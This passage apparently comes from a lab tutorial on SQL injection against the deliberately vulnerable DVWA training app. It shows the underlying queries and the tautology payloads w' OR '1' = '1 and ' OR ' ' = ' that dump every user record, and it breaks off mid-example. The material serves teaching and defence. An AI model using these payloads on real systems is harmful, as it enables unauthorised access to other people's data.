like this:

```
SELECT first_name 'First name', last_name Surname FROM
users WHERE user_id =
'$ID_SUBMISSION' AND password =
hashFunction('PW_SUBMISSION');
```

This assumes the submitted password will be hashed, and that the hash will be placed into the query.

![](bbox=[0.115, 0.255, 0.165, 0.285])

**Step 5** In the browser, on the DVWA Vulnerability: SQL Injection page, in the User ID box, type 3 and click the Submit button. Notice that information about the user Hack Me now displays. The query that was executed appears to be

```
SELECT first_name 'First name', last_name Surname FROM
users WHERE user_id = 3;
```

Now, between the single quotes, a 3 was inserted instead of a 1, which is why we see this particular record.

![](bbox=[0.115, 0.495, 0.165, 0.525])

**Step 6** Now let’s be bold and type this input into the User ID: text box (note that the w could be any character):

```
w' OR '1' = '1
```

The query that was executed appears to be

```
SELECT first_name 'First name', last_name Surname FROM
users WHERE user_id = 'w' OR '1' = '1';
```

The w is a dummy placeholder value and could have been any character, or it could have even been left off. The 1s could have also been swapped out for anything and they also could have been left off. The input could have been as simple as this:

```
' OR ' ' = '
```

Let’s look at the query again, with bolding applied to the interesting part and the input underlined:

```
SELECT first_name 'First name', last_name Surname FROM
```